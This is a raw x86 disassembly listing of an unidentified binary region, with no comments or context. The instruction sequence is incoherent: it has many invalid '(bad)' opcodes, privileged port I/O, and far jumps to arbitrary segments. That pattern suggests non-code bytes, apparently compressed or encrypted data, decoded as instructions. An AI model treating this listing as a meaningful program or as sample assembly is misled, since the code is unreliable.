  4151dc:	ror    BYTE PTR [esi+0x6cb13403],cl
  4151e2:	fstp   QWORD PTR [esp+ecx*1+0x56]
  4151e6:	xor    esi,DWORD PTR [ebx+0x38]
  4151e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4151ea:	cmp    dl,al
  4151ec:	ins    DWORD PTR es:[edi],dx
  4151ed:	retf   
  4151ee:	in     eax,dx
  4151ef:	or     al,0x92
  4151f1:	ins    BYTE PTR es:[edi],dx
  4151f2:	cdq    
  4151f3:	retf   
  4151f4:	xor    cl,BYTE PTR [edx]
  4151f6:	mov    eax,DWORD PTR [edi]
  4151f8:	lds    edx,FWORD PTR [eax-0x27079a17]
  4151fe:	mov    eax,ds:0x234aac58
  415203:	or     bh,BYTE PTR [edx]
  415205:	mov    ds:0xc8d86de0,eax
  41520a:	ss jb  0x415212
  41520d:	add    eax,0xd8fc98aa
  415212:	out    dx,al
  415213:	call   FWORD PTR [eax+0x6420094c]
  415219:	daa    
  41521a:	add    eax,0x31ea6a66
  41521f:	idiv   DWORD PTR [eax-0x69428f06]
  415225:	sbb    edx,edx
  415227:	shl    BYTE PTR [ebx],1
  415229:	jns    0x4151c9
  41522b:	mov    ebx,0xf05d96a7
  415230:	inc    esp
  415231:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415232:	fld    st(0)
  415234:	sub    BYTE PTR [edi-0x9],bh
  415237:	icebp  
  415238:	or     ah,BYTE PTR [edx]
  41523a:	fld    TBYTE PTR [edx-0x61]
  41523d:	lea    eax,[ebp+0x20]
  415240:	and    al,BYTE PTR [esi+0x5badd879]
  415246:	jb     0x4151fe
  415248:	xor    eax,0xb3046c30
  41524d:	mov    ebx,0x2d16948c
  415252:	aaa    
  415253:	inc    esp
  415254:	inc    esi
  415255:	cmp    al,0xb8
  415257:	in     al,0x86
  415259:	popa   
  41525a:	ds jge 0x41522b
  41525d:	and    eax,0xcdaedd06
  415262:	mov    ah,0xe7
  415264:	into   
  415265:	pop    edx
  415266:	jns    0x415281
  415268:	sub    DWORD PTR [edx+0x308ea38c],ecx
  41526e:	lahf   
  41526f:	push   cs
  415270:	ror    BYTE PTR [ecx+0x4be5641f],0x38
  415277:	out    0x23,eax
  415279:	cmp    bl,BYTE PTR [ecx]
  41527b:	int    0x9b
  41527d:	aam    0x0
  41527f:	jle    0x41524d
  415281:	adc    DWORD PTR [ebx+edx*4],eax
  415284:	lods   eax,DWORD PTR ds:[esi]
  415285:	fcmovnbe st,st(7)
  415287:	inc    eax
  415288:	dec    ebp
  415289:	xchg   edx,eax
  41528a:	mov    bh,0xfa
  41528c:	into   
  41528d:	js     0x4152bc
  41528f:	sbb    BYTE PTR [ebx+0x64],bh
  415292:	sbb    esp,edx
  415294:	fistp  DWORD PTR [edx-0x13e2f3ac]
  41529a:	ins    DWORD PTR es:[edi],dx
  41529b:	push   eax
  41529c:	lods   eax,DWORD PTR ds:[esi]
  41529d:	fimul  DWORD PTR [eax]
  41529f:	mov    eax,0x29c659d9
  4152a4:	cdq    
  4152a5:	mov    fs,eax
  4152a7:	push   esi
  4152a8:	mov    bl,0xd6
  4152aa:	mov    dl,0x31
  4152ac:	xchg   ecx,eax
  4152ad:	les    esp,FWORD PTR [ecx]
  4152af:	fsub   DWORD PTR [ebx]
  4152b1:	mov    ebp,0x6e800e1a
  4152b6:	adc    DWORD PTR [esi-0x3bf32b1],esi
  4152bc:	popf   
  4152bd:	fndisi(8087 only) 
  4152bf:	pop    es
  4152c0:	sub    eax,DWORD PTR [eax+0x21]
  4152c3:	dec    eax
  4152c4:	pop    esi
  4152c5:	sbb    eax,0x14d56cda
  4152ca:	imul   edx,DWORD PTR [ecx-0x6146643],0x867c292e
  4152d4:	inc    ebp
  4152d5:	pop    ss
  4152d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4152d7:	scas   eax,DWORD PTR es:[edi]
  4152d8:	test   al,0xc2
  4152da:	cmp    al,0x4d
  4152dc:	dec    DWORD PTR fs:[ebx]
  4152df:	int3   
  4152e0:	xchg   ebx,eax
  4152e1:	cmp    edx,DWORD PTR [edi]
  4152e3:	mov    esp,0x50de3197
  4152e8:	mov    bl,0x9f
  4152ea:	pop    ebx
  4152eb:	in     al,dx
  4152ec:	fisttp QWORD PTR [eax+0xa277aa7]
  4152f2:	lds    ebx,FWORD PTR [edx*8+0x5776ff6a]
  4152f9:	inc    edi
  4152fa:	aas    
  4152fb:	daa    
  4152fc:	ins    DWORD PTR es:[edi],dx
  4152fd:	in     al,dx
  4152fe:	lods   al,BYTE PTR ds:[esi]
  4152ff:	arpl   di,bp
  415301:	call   FWORD PTR [edi+ebp*8+0x18993f8]
  415308:	pop    ds
  415309:	sar    BYTE PTR [eax+0x49cb67a4],1
  41530f:	aad    0xb9
  415311:	mov    bh,0xe0
  415313:	and    BYTE PTR [ecx+0x7e],dl
  415316:	pop    ebp
  415317:	in     al,0x2b
  415319:	mov    eax,0x74de27a1
  41531e:	jecxz  0x4152c4
  415320:	inc    ecx
  415321:	in     eax,0x53
  415323:	inc    ecx
  415324:	inc    edx
  415325:	mov    al,ds:0xd04e3f0e
  41532a:	pop    es
  41532b:	fistp  WORD PTR [edx+ebx*8-0x6ce80435]
  415332:	(bad)  
  415333:	test   BYTE PTR [ebp-0x1d],cl
  415336:	shl    BYTE PTR [esi-0x76],cl
  415339:	sub    DWORD PTR [eax+eiz*4],esp
  41533c:	jl     0x415330
  41533e:	jae    0x4152ff
  415340:	jecxz  0x4153a7
  415342:	and    eax,0xc67aefba
  415347:	loope  0x4152fb
  415349:	pop    ss
  41534a:	add    cl,BYTE PTR [ebx]
  41534c:	or     esi,esi
  41534e:	xlat   BYTE PTR ds:[ebx]
  41534f:	in     eax,dx
  415350:	repz loope 0x41537f
  415353:	call   0x126f:0x16033d9a
  41535a:	das    
  41535b:	imul   esi,DWORD PTR [ebp-0x6bd8dcbd],0x114a0902
  415365:	push   esp
  415366:	jne    0x41535c
  415368:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415369:	cdq    
  41536a:	dec    ebp
  41536b:	call   0x37ec:0x6f7e6f61
  415372:	retf   0x12ce
  415375:	ins    DWORD PTR es:[edi],dx
  415376:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415377:	mov    esi,0x6465f60a
  41537c:	outs   dx,BYTE PTR ds:[esi]
  41537d:	jg     0x41533d
  41537f:	xchg   ebp,eax
  415380:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415381:	xor    al,0x7f
  415383:	pop    esi
  415384:	ins    DWORD PTR es:[edi],dx
  415385:	daa    
  415386:	dec    ebx
  415387:	pushf  
  415388:	popf   
  415389:	aam    0xc3
  41538b:	(bad)  
  41538c:	xchg   ebx,eax
  41538d:	jb     0x4153da
  41538f:	sahf   
  415390:	jnp    0x415407
  415392:	dec    BYTE PTR [ebx]
  415394:	xor    esp,DWORD PTR [ecx+eiz*4+0x7c]
  415398:	or     esi,DWORD PTR [ebp-0xd]
  41539b:	mov    esp,DWORD PTR [edi+0x2b7be2f6]
  4153a1:	xor    BYTE PTR [eax+0x23],0xa
  4153a5:	xchg   DWORD PTR [eax],edi
  4153a7:	jge    0x415339
  4153a9:	and    eax,0xbb45a81e
  4153ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4153af:	int    0xa0
  4153b1:	sub    eax,0xdc4a886c
  4153b6:	sub    al,0x4d
  4153b8:	xchg   ebx,eax
  4153b9:	mov    esp,ecx
  4153bb:	iret   
  4153bc:	add    BYTE PTR [ecx-0x1b8e473c],dl
  4153c2:	out    0x24,al
  4153c4:	and    al,0xb7
  4153c6:	test   al,0x70
  4153c8:	jle    0x415391
  4153ca:	mov    esi,0x2e63cbd1
  4153cf:	addr16 aaa 
  4153d1:	ins    BYTE PTR es:[edi],dx
  4153d2:	(bad)  
  4153d3:	cmp    BYTE PTR [edx+0x1033dc67],bl
  4153d9:	bound  esp,QWORD PTR [edi-0x2c6a0d64]
  4153df:	out    0x85,al
  4153e1:	int3   
  4153e2:	jg     0x415449
  4153e4:	fsubr  QWORD PTR [edx-0xc1b647]
  4153ea:	popf   
  4153eb:	enter  0xee08,0xda
  4153ef:	pop    esp
  4153f0:	(bad)
  4153f4:	cwde   
  4153f5:	pop    ds
  4153f6:	data16 sub al,0x27
  4153f9:	sbb    BYTE PTR [ebp-0x3e],0x4d
  4153fd:	fwait
  4153fe:	cli    
  4153ff:	jno    0x415475
  415401:	cmp    BYTE PTR [eax+0x7b],al
  415404:	enter  0x5cac,0x4d
  415408:	stc    
  415409:	pop    esi
  41540a:	jmp    0x8f626242
  41540f:	mov    ebp,0xe9e83574
  415414:	adc    DWORD PTR [edx-0x59cfb033],esp
  41541a:	es loopne 0x415493
  41541d:	xor    ebp,DWORD PTR [edx]
  41541f:	pop    eax
  415420:	jnp    0x415498
  415422:	call   0x3acf28d
  415427:	ret    
  415428:	add    edi,esp
  41542a:	xchg   esp,eax
  41542b:	das    
  41542c:	ret    
  41542d:	add    ebx,DWORD PTR [edx]
  41542f:	xchg   edi,eax
  415430:	ja     0x4153ca
  415432:	fistp  QWORD PTR [edi]
  415434:	das    
  415435:	dec    edi
  415436:	out    0x62,eax
  415438:	sub    al,0x15
  41543a:	loop   0x415426
  41543c:	sbb    eax,0x7f8b97b2
  415441:	mov    edi,0xf06573b
  415446:	cmp    ch,BYTE PTR es:[ebx-0x34]
  41544a:	es mov esp,0x147ec4dd
  415450:	sahf   
  415451:	xchg   esp,eax
  415452:	push   cs
  415453:	mov    ebp,0xbf9dd3de
  415458:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415459:	mov    ds:0x91e3a652,eax
  41545e:	or     al,0xd5
  415460:	fmul   QWORD PTR [ecx]
  415462:	in     al,dx
  415463:	push   edi
  415464:	outs   dx,BYTE PTR ds:[esi]
  415465:	sub    eax,0xc7044bdc
  41546a:	mov    al,0xba
  41546c:	or     BYTE PTR [ebx-0x1a],dl
  41546f:	push   edx
  415470:	aad    0xda
  415472:	jnp    0x415455
  415474:	and    eax,0x86ae8f9c
  415479:	lods   al,BYTE PTR ds:[esi]
  41547a:	enter  0xde61,0xde
  41547e:	xchg   edx,esp
  415480:	leave  
  415481:	add    ebx,DWORD PTR [edx+0x45]
  415484:	outs   dx,BYTE PTR ds:[esi]
  415485:	and    DWORD PTR ds:0xcb8924fb,ebx
  41548b:	dec    ebx
  41548c:	ret    0x3d75
  41548f:	jmp    0x3558:0x5ef309f1
  415496:	sub    al,ch
  415498:	nop
  415499:	call   0xa4e:0x47aa8238
  4154a0:	or     esp,esp
  4154a2:	retf   0xfe89
  4154a5:	or     al,0x3e
  4154a7:	mov    ?,WORD PTR [edi+0x44e119b6]
  4154ad:	push   es
  4154ae:	jg     0x415471
  4154b0:	vpunpckhqdq xmm1,xmm1,XMMWORD PTR [eax+eax*2-0x67]
  4154b6:	dec    ecx
  4154b7:	imul   edx,DWORD PTR [esi+0x10bd6284],0xe7d164a6
  4154c1:	adc    eax,0x709e7403
  4154c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4154c7:	ja     0x41544b
  4154c9:	scas   eax,DWORD PTR es:[edi]
  4154ca:	aas    
  4154cb:	add    DWORD PTR [edx-0x48d73ee5],ecx
  4154d1:	mov    eax,0x8f523099
  4154d6:	out    dx,al
  4154d7:	inc    edi
  4154d8:	jp     0x41552d
  4154da:	push   ss
  4154db:	ficom  DWORD PTR [edi-0x22503864]
  4154e1:	mov    edi,0xba5c787f
  4154e6:	cmp    eax,0xd8db4a8
  4154eb:	mov    edi,0x5ed27a67
  4154f0:	xor    eax,0x44322931
  4154f5:	or     eax,0xdb4569f2
  4154fa:	pop    esi
  4154fb:	sub    edx,DWORD PTR [ebx]
  4154fd:	jmp    0xdc00:0xf6f1c6e4
  415504:	jnp    0x41550d
  415506:	clc    
  415507:	add    ah,bl
  415509:	es mov edi,0x54ec7c
  41550f:	xchg   ebx,eax
  415510:	or     al,BYTE PTR [esi]
  415512:	or     DWORD PTR [eax-0x5f9ebb34],0xcdb4bafd
  41551c:	popf   
  41551d:	stos   DWORD PTR es:[edi],eax
  41551e:	cmp    DWORD PTR [eax],ebp
  415520:	in     al,0x1f
  415522:	jecxz  0x415526
  415524:	push   ebx
  415525:	dec    ecx
  415526:	inc    edx
  415527:	out    0x42,al
  415529:	test   al,0xad
  41552b:	xchg   ebx,eax
  41552c:	shr    BYTE PTR [edi],cl
  41552e:	add    ecx,ebx
  415530:	cmp    eax,0xc281ee31
  415535:	scas   al,BYTE PTR es:[edi]
  415536:	pushf  
  415537:	mov    edi,0x33c47c83
  41553c:	inc    ecx
  41553d:	jg     0x4154d5
  41553f:	pop    ss
  415540:	imul   edx,DWORD PTR [eax+0x5f9db2e3],0x44
  415547:	inc    ebx
  415548:	jae    0x4154fa
  41554a:	out    dx,al
  41554b:	sub    bh,ch
  41554d:	jne    0x41556e
  41554f:	mov    ds:0x30a9a57b,eax
  415554:	mov    ss,WORD PTR [esi-0x54]
  415557:	lods   eax,DWORD PTR ds:[esi]
  415558:	jl     0x415581
  41555a:	pop    ebp
  41555b:	mov    ss,ebx
  41555d:	(bad)  
  41555e:	jae    0x4155df
  415560:	cdq    
  415561:	imul   ebx,DWORD PTR [ebx],0x25
  415564:	scas   al,BYTE PTR es:[edi]
  415565:	gs (bad) 
  415567:	out    0x93,al
  415569:	mov    ah,0xb3
  41556b:	cmc    
  41556c:	ja     0x415569
  41556e:	mov    ebp,0x3a9045ad
  415573:	pop    edi
  415574:	arpl   WORD PTR [ebp-0x69a4acad],ax
  41557a:	jbe    0x4155b7
  41557c:	xlat   BYTE PTR ds:[bx]
  41557e:	dec    edi
  41557f:	push   ebp
  415580:	xor    bl,dh
  415582:	out    dx,eax
  415583:	xor    DWORD PTR [ebx+0x4e],esi
  415586:	adc    DWORD PTR [ecx-0x76],esp
  415589:	dec    ebx
  41558a:	sbb    al,0x12
  41558c:	in     eax,dx
  41558d:	push   0x59
  41558f:	push   0xffffffd7
  415591:	imul   esp,DWORD PTR [esi+0x76],0xb3aece87
  415598:	loope  0x41559a
  41559a:	pop    ds
  41559b:	aaa    
  41559c:	push   ss
  41559d:	pop    edi
  41559e:	(bad)  
  41559f:	lods   eax,DWORD PTR ds:[esi]
  4155a0:	aad    0x7e
  4155a2:	rcl    BYTE PTR [ebx+0x4b50b09a],0x54
  4155a9:	mov    al,ds:0x9b54de05
  4155ae:	pushf  
  4155af:	add    al,0x6c
  4155b1:	xchg   edx,eax
  4155b2:	mov    ds:0x8bbe7efb,eax
  4155b7:	mov    bh,0x8
  4155b9:	adc    cl,bl
  4155bb:	aaa    
  4155bc:	add    DWORD PTR [ecx-0x638a6327],edi
  4155c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4155c3:	test   DWORD PTR [esi+ebp*2-0x67],eax
  4155c7:	stc    
  4155c8:	dec    ebp
  4155c9:	cmp    BYTE PTR [ebx-0x77],ah
  4155cc:	mov    ah,bh
  4155ce:	push   edx
  4155cf:	fsubr  DWORD PTR [ebx-0x56b2e311]
  4155d5:	jge    0x415559
  4155d7:	xor    DWORD PTR [edx+ebx*2-0x5b],esp
  4155db:	fild   DWORD PTR [eax-0x65e8c06b]
  4155e1:	pop    ebp
  4155e2:	fnstsw WORD PTR [ebx+eax*4]
  4155e5:	leave  
  4155e6:	and    dl,BYTE PTR [ebx+edi*4-0x2d]
  4155ea:	cmp    dl,BYTE PTR [eax]
  4155ec:	fsub   QWORD PTR [ecx+ebp*2-0x50676d31]
  4155f3:	sbb    bl,ch
  4155f5:	add    DWORD PTR [edi+ecx*4+0xa789604],0xbbfa8eb8
  415600:	mov    esi,esp
  415602:	enter  0xd64,0xb8
  415606:	mov    dh,0xd4
  415608:	popf   
  415609:	out    0x94,al
  41560b:	(bad)  
  41560c:	sar    BYTE PTR [ebx+0x2b613971],1
  415612:	sbb    eax,0x9f12e6a0
  415617:	sbb    dh,BYTE PTR [ebx+0x43f499c0]
  41561d:	int    0x38
  41561f:	mov    eax,0x17f42cf2
  415624:	jmp    0xfd522df4
  415629:	mov    esp,0x5aaa75ce
  41562e:	dec    ebx
  41562f:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  415631:	xor    BYTE PTR [eax+ebp*2+0x23],0xd4
  415636:	inc    eax
  415637:	jl     0x415602
  415639:	cld    
  41563a:	cmp    dh,ch
  41563c:	mov    al,0x34
  41563e:	xchg   esp,eax
  41563f:	push   ds
  415640:	call   0x250345fb
  415645:	jle    0x41565f
  415647:	popa   
  415648:	rol    BYTE PTR [edx-0x15c79b41],1
  41564e:	push   esp
  41564f:	mov    DWORD PTR [ecx-0x1d],esi
  415652:	xor    DWORD PTR [edx+0x25b115bb],edi
  415658:	inc    eax
  415659:	sbb    eax,0xa36dcbbb
  41565e:	ret    
  41565f:	jno    0x415668
  415661:	push   ebp
  415662:	or     BYTE PTR [ecx-0x17ee6c69],dh
  415668:	fimul  DWORD PTR [eax-0x68]
  41566b:	leave  
  41566c:	add    al,0xda
  41566e:	enter  0x9019,0xde
  415672:	dec    ecx
  415673:	push   0xbce22310
  415678:	jge    0x41561c
  41567a:	ss dec edi
  41567c:	sahf   
  41567d:	xchg   esp,eax
  41567e:	in     al,dx
  41567f:	push   esi
  415680:	cmp    al,0xff
  415682:	add    DWORD PTR [ecx+ecx*8-0x2613c9be],ebp
  415689:	rcr    DWORD PTR [ecx+0x69],0x5f
  41568d:	and    bl,BYTE PTR [ecx]
  41568f:	mov    esp,0xc1e74f8
  415694:	not    DWORD PTR [edx+0x415da8ce]
  41569a:	pop    edx
  41569b:	lods   al,BYTE PTR ds:[esi]
  41569c:	lods   eax,DWORD PTR ds:[esi]
  41569d:	ror    DWORD PTR [esi],0x6a
  4156a0:	das    
  4156a1:	outs   dx,BYTE PTR ds:[esi]
  4156a2:	dec    edx
  4156a3:	das    
  4156a4:	jmp    0x415626
  4156a6:	pop    ds
  4156a7:	xor    eax,DWORD PTR [ebp+0x7dc43155]
  4156ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4156ae:	or     BYTE PTR [edx-0x6f],bh
  4156b1:	retf   0x58d2
  4156b4:	xor    BYTE PTR [ecx-0x13560200],bh
  4156ba:	push   ds
  4156bb:	fmul   st,st(3)
  4156bd:	es cmp ch,dh
  4156c0:	ret    0x31a9
  4156c3:	aam    0x77
  4156c5:	mov    ecx,esp
  4156c7:	pusha  
  4156c8:	jg     0x41573a
  4156ca:	xchg   ch,bh
  4156cc:	scas   al,BYTE PTR es:[di]
  4156ce:	inc    edi
  4156cf:	inc    ecx
  4156d0:	cdq    
  4156d1:	inc    edi
  4156d2:	dec    edi
  4156d3:	lea    ebx,[ebx-0x794de15b]
  4156d9:	pop    ds
  4156da:	dec    esi
  4156db:	inc    edi
  4156dc:	mov    bl,0x77
  4156de:	or     BYTE PTR [edi-0xcef178a],al
  4156e4:	ret    0x66dc
  4156e7:	mov    al,0xcf
  4156e9:	outs   dx,BYTE PTR ds:[esi]
  4156ea:	repnz cli 
  4156ec:	adc    ebp,esi
  4156ee:	mov    edi,0xaffdf9e4
  4156f3:	cld    
  4156f4:	pop    ebp
  4156f5:	xchg   DWORD PTR [esi-0x62],ecx
  4156f8:	dec    edi
  4156f9:	arpl   WORD PTR [ebp+0xf157e83],bp
  4156ff:	push   es
  415700:	fistp  WORD PTR [ebp+0x5e4a26d1]
  415706:	sub    al,0xdb
  415708:	xchg   edi,eax
  415709:	rol    DWORD PTR [edi+0xd],1
  41570c:	out    dx,eax
  41570d:	ss shl ah,0xfd
  415711:	inc    esi
  415712:	out    dx,al
  415713:	or     cl,dh
  415715:	mov    ds:0x4add02f,al
  41571a:	inc    esi
  41571b:	cwde   
  41571c:	mov    ds:0xa84cc3b3,al
  415721:	dec    edx
  415722:	mov    ecx,0xdb78615b
  415727:	icebp  
  415728:	jae    0x41578e
  41572a:	(bad)
  41572d:	and    eax,0xcf12f879
  415732:	inc    ecx
  415733:	jmp    0x415741
  415735:	test   BYTE PTR [edi],dl
  415737:	fcomp  st(0)
  415739:	and    ch,BYTE PTR [ebp-0x277d67fc]
  41573f:	jp     0x415758
  415741:	xchg   edx,eax
  415742:	(bad)  
  415743:	lds    ebp,FWORD PTR [edi-0x6e2eecdc]
  415749:	jo     0x4156e8
  41574b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41574c:	jle    0x415768
  41574e:	call   0x8f3539d1
  415753:	loop   0x415718
  415755:	jle    0x415762
  415757:	pop    ss
  415758:	xor    DWORD PTR [esi],edx
  41575a:	arpl   si,bx
  41575c:	out    dx,al
  41575d:	(bad)  
  41575e:	ins    BYTE PTR es:[edi],dx
  41575f:	adc    al,0x95
  415761:	adc    ecx,ebp
  415763:	xchg   ebx,eax
  415764:	cmc    
  415765:	mov    al,ds:0x3ebe2c40
  41576a:	repnz xchg esp,eax
  41576c:	jge    0x415779
  41576e:	jne    0x415737
  415770:	int    0x2f
  415772:	sbb    ebx,DWORD PTR [ebx]
  415774:	fist   WORD PTR [esp+ebp*4+0x216e9405]
  41577b:	icebp  
  41577c:	push   es
  41577d:	mov    ecx,0xe4a93e13
  415782:	add    al,0x9c
  415784:	(bad)  
  415785:	sub    al,BYTE PTR [edx]
  415787:	test   DWORD PTR [eax+0x14],edi
  41578a:	pop    ebp
  41578b:	push   edx
  41578c:	sub    edx,ecx
  41578e:	fstp   TBYTE PTR [edx-0x51]
  415791:	and    bl,BYTE PTR [ebx+0x41]
  415794:	hlt    
  415795:	in     eax,dx
  415796:	mov    cl,0xf4
  415798:	sbb    bh,dl
  41579a:	fisttp QWORD PTR [edx]
  41579c:	(bad)  
  41579e:	jbe    0x41578a
  4157a0:	push   ebx
  4157a1:	sub    ecx,esp
  4157a3:	leave  
  4157a4:	dec    edi
  4157a5:	mov    eax,edi
  4157a7:	cdq    
  4157a8:	les    esp,FWORD PTR [edi-0x68]
  4157ab:	cli    
  4157ac:	test   BYTE PTR [edx+0x5a],dh
  4157af:	rcr    ebx,1
  4157b1:	data16 fbstp TBYTE PTR [esi]
  4157b4:	sbb    DWORD PTR [ebx],esi
  4157b6:	fbld   TBYTE PTR [ecx+0x68917981]
  4157bc:	ja     0x41580c
  4157be:	das    
  4157bf:	popf   
  4157c0:	call   DWORD PTR [esi+0x57ad3899]
  4157c6:	test   eax,0xe198ff06
  4157cb:	loopne 0x4157b6
  4157cd:	sbb    BYTE PTR [edx-0x30],dl
  4157d0:	lds    edx,FWORD PTR [ebp+0x7b]
  4157d3:	mov    ebp,ecx
  4157d5:	push   edi
  4157d6:	push   es
  4157d7:	adc    al,ah
  4157d9:	mov    cs,WORD PTR [edx-0x7e9ca428]
  4157df:	nop
  4157e0:	or     dh,BYTE PTR [ecx+0x14fb02de]
  4157e6:	dec    ebx
  4157e7:	call   0xbe0faf87
  4157ec:	scas   eax,DWORD PTR es:[edi]
  4157ed:	bound  ebp,QWORD PTR [eax]
  4157ef:	stos   BYTE PTR es:[edi],al
  4157f0:	ret    
  4157f1:	daa    
  4157f2:	jl     0x4157d9
  4157f4:	test   DWORD PTR [edx-0x58],esp
  4157f7:	jnp    0x4157b5
  4157f9:	jnp    0x415789
  4157fb:	sbb    eax,0x80e77380
  415800:	test   bh,0xa2
  415803:	push   esi
  415804:	jg     0x4157f3
  415806:	mov    esi,0xfa97cb8d
  41580b:	fnsave fs:0x10bbe77e
  415812:	sti    
  415813:	out    0x2e,eax
  415815:	push   ds
  415816:	dec    edi
  415817:	xor    al,0xc8
  415819:	mov    esi,0x51223226
  41581e:	mov    edi,0x3391dafd
  415823:	or     edx,DWORD PTR ds:0x70a9ff15
  415829:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41582a:	mov    esi,0x1cc7c544
  41582f:	mov    eax,0x1a19d71e
  415834:	or     DWORD PTR [ebp*8+0x3f5aee8c],edx
  41583b:	adc    al,0x64
  41583d:	sbb    al,0x9f
  41583f:	push   esi
  415840:	das    
  415841:	fnstenv [ecx-0x46ff8b7c]
  415847:	xchg   ecx,eax
  415848:	daa    
  415849:	es daa 
  41584b:	fmul   st(7),st
  41584d:	ja     0x4158cb
  41584f:	mov    DWORD PTR [esi+0x11],ebx
  415852:	sbb    ecx,DWORD PTR [ebx]
  415854:	imul   DWORD PTR [eax+0x1d47b26c]
  41585a:	(bad)
  41585f:	bound  ebp,QWORD PTR [esi]
  415861:	popf   
  415862:	push   cs
  415863:	jle    0x41582c
  415865:	inc    edx
  415866:	imul   esi,DWORD PTR [si-0x5c],0x3a3d3fb9
  41586e:	fist   DWORD PTR [ecx]
  415870:	inc    edi
  415871:	jno    0x4157f7
  415873:	xchg   edx,eax
  415874:	mov    ecx,0x45fd4c56
  415879:	xor    DWORD PTR [edi+0x41],0xac0f2792
  415880:	pop    es
  415881:	jae    0x41588b
  415883:	push   ss
  415884:	xor    bh,al
  415886:	mov    dh,0x20
  415888:	test   eax,0x128df550
  41588d:	ja     0x41585f
  41588f:	mov    eax,0xd332f03a
  415894:	push   es
  415895:	ret    
  415896:	xor    ch,BYTE PTR [esi+ebp*2]
  415899:	and    dl,BYTE PTR [ecx-0x2529ae9f]
  41589f:	scas   al,BYTE PTR es:[edi]
  4158a0:	xor    DWORD PTR [edx+0x3ff251eb],0xdb2d737
  4158aa:	in     eax,dx
  4158ab:	push   edx
  4158ac:	and    edi,DWORD PTR [eax+0x5e]
  4158af:	inc    esi
  4158b0:	shr    BYTE PTR [esi],cl
  4158b2:	in     eax,0xa1
  4158b4:	and    ecx,DWORD PTR [eax+0x60c04c70]
  4158ba:	lods   eax,DWORD PTR ds:[esi]
  4158bb:	gs push edi
  4158bd:	ins    BYTE PTR es:[edi],dx
  4158be:	(bad)  
  4158bf:	out    0xb3,eax
  4158c1:	inc    esp
  4158c2:	adc    ebx,esi
  4158c4:	div    BYTE PTR [ebx-0x3c]
  4158c7:	(bad)  
  4158c8:	(bad)  
  4158c9:	jg     0x415852
  4158cb:	jne    0x41589b
  4158cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4158ce:	push   ds
  4158cf:	lea    ebp,[ebx]
  4158d1:	pop    ebp
  4158d2:	push   ecx
  4158d3:	dec    edi
  4158d4:	scas   al,BYTE PTR es:[edi]
  4158d5:	or     esp,DWORD PTR [edi+0x7]
  4158d8:	add    eax,0x2b6ae604
  4158dd:	mov    eax,ss:0x76b895f3
  4158e3:	jns    0x4158fd
  4158e5:	push   ebx
  4158e6:	pushf  
  4158e7:	sbb    bh,BYTE PTR [eax]
  4158e9:	jo     0x415941
  4158eb:	aad    0x8c
  4158ed:	pop    ebp
  4158ee:	and    ch,BYTE PTR [esi-0x7d91d95d]
  4158f4:	rcr    BYTE PTR [ebp+edi*1+0x2f],0x9a
  4158f9:	jl     0x4158d1
  4158fb:	daa    
  4158fc:	mov    ds:0x45fea33c,al
  415901:	cmp    dh,bl
  415903:	out    dx,al
  415904:	leave  
  415905:	mov    DWORD PTR [esi-0xe],edx
  415908:	sub    esi,DWORD PTR [eax-0x33eef685]
  41590e:	mov    esi,edi
  415910:	add    al,0xdd
  415912:	jnp    0x41591a
  415914:	or     esi,DWORD PTR [ebx+ecx*8]
  415917:	pop    ebp
  415918:	cs jmp 0x41597e
  41591b:	mov    edi,gs
  41591d:	sbb    ebp,DWORD PTR [eax-0x42f7a642]
  415923:	sar    edx,1
  415925:	ret    0xa1d3
  415928:	xchg   ebp,eax
  415929:	sub    bh,bl
  41592b:	loope  0x4159a8
  41592d:	inc    ecx
  41592e:	fst    QWORD PTR [ebp+0x5e59d4ff]
  415934:	sub    BYTE PTR [edx+0x61],bh
  415937:	jb     0x415986
  415939:	mov    al,ds:0xf12f4be0
  41593e:	call   0xe45c4398
  415943:	xor    BYTE PTR ds:[esi],bl
  415946:	inc    ebp
  415947:	aas    
  415948:	mov    bl,0xd9
  41594a:	dec    esp
  41594b:	addr16 mov ch,0x16
  41594e:	lock and DWORD PTR [edx+0x24],esi
  415952:	push   esi
  415953:	das    
  415954:	adc    dl,BYTE PTR [edi+0x672f9911]
  41595a:	adc    cl,BYTE PTR [esi+0x10]
  41595d:	jns    0x41597c
  41595f:	shr    DWORD PTR [ecx+ebx*1],cl
  415962:	and    eax,eax
  415964:	out    dx,al
  415965:	test   eax,0xdf10e97b
  41596a:	shl    DWORD PTR [ebx],0xf4
  41596d:	or     ecx,ebx
  41596f:	push   ecx
  415970:	pop    ebx
  415971:	xor    ah,BYTE PTR ss:[esi+0x8bbda7e]
  415978:	xor    ah,BYTE PTR [ecx-0x46]
  41597b:	aas    
  41597c:	call   0x6b71bd51
  415981:	or     al,BYTE PTR [ecx-0x23]
  415984:	jbe    0x4159da
  415986:	push   edx
  415987:	pop    DWORD PTR [ebx-0x54dfbe34]
  41598d:	es jg  0x41594b
  415990:	push   ss
  415991:	mov    al,0x85
  415993:	cs retf 
  415995:	std    
  415996:	pop    ecx
  415997:	out    0x40,al
  415999:	push   ds
  41599a:	imul   edx,DWORD PTR [edx],0xe34508a8
  4159a0:	retf   
  4159a1:	cwde   
  4159a2:	out    dx,al
  4159a3:	aam    0x87
  4159a5:	jmp    0xbf24:0x94851513
  4159ac:	fwait
  4159ad:	iret   
  4159ae:	loop   0x4159c0
  4159b0:	mov    ecx,0x623a646d
  4159b5:	fldcw  WORD PTR [ecx]
  4159b7:	mov    ebp,0x4e5b9074
  4159bc:	xchg   ebp,eax
  4159bd:	add    DWORD PTR [esi-0x29],ebp
  4159c0:	stos   DWORD PTR es:[edi],eax
  4159c1:	mul    BYTE PTR [edi-0x26]
  4159c4:	shr    eax,cl
  4159c6:	push   ds
  4159c7:	dec    edx
